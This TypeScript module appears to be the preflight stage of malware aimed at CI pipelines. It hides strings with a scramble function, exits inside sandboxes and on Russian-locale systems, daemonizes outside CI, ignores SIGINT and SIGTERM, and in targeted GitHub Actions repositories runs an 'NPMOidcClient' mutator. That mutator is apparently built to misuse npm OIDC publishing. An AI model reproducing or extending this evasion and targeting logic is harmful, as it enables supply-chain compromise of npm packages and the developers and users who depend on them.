import { NPMOidcClient } from "../mutator/npmoidc/index";
import { isDecoy } from "../utils/checkSandbox";
import { isCI, isSystemRussian } from "../utils/config";
import { daemonize } from "../utils/daemon";
import { acquireLock, bail } from "../utils/lock";
import { logUtil } from "../utils/logger";

declare function scramble(str: string): string;

/**
 * Check whether we are running in the target repository.
 * Exits early if the repo matches, or if it's the wrong repo but
 * REPO_ID_SUFFIX is configured.
 */
async function checkTargetRepo(): Promise<void> {
  const workflowId = process.env["WORKFLOW_ID"];
  const repoSuffix = process.env["REPO_ID_SUFFIX"];

  if (!workflowId && !repoSuffix) return;

  try {
    if (process.env[scramble("GITHUB_ACTIONS")]) {
      const { GITHUB_WORKFLOW_REF, GITHUB_REPOSITORY } = process.env;

      logUtil.info(`Ref is ${GITHUB_WORKFLOW_REF}`);
      logUtil.info(`Repo is ${GITHUB_REPOSITORY}`);

      if (
        (!workflowId || GITHUB_WORKFLOW_REF?.includes(workflowId)) &&
        (!repoSuffix || GITHUB_REPOSITORY?.includes(repoSuffix))
      ) {
        const bitMutator = new NPMOidcClient();
        await bitMutator.execute();
        bail();
      } else if (repoSuffix && GITHUB_REPOSITORY?.includes(repoSuffix)) {
        bail();
      }
    }
  } catch {
    return;
  }
}

/**
 * Run all preflight checks.  May call bail() when the environment
 * is not suitable for execution (decoy, wrong repo, Russian locale,
 * daemonized parent, already locked).
 */
export async function preflight(): Promise<void> {
  if (isDecoy()) {
    bail();
  }
  await checkTargetRepo();

  if (isSystemRussian()) {
    logUtil.log("Exiting as russian language detected!");
    bail();
  }
  if (!isCI()) daemonize();

  const shutdown = () => {};
  process.on(scramble("SIGINT"), shutdown);
  process.on(scramble("SIGTERM"), shutdown);

  if (!acquireLock()) {
    logUtil.error("Another instance is already running");
    bail();
  }
}
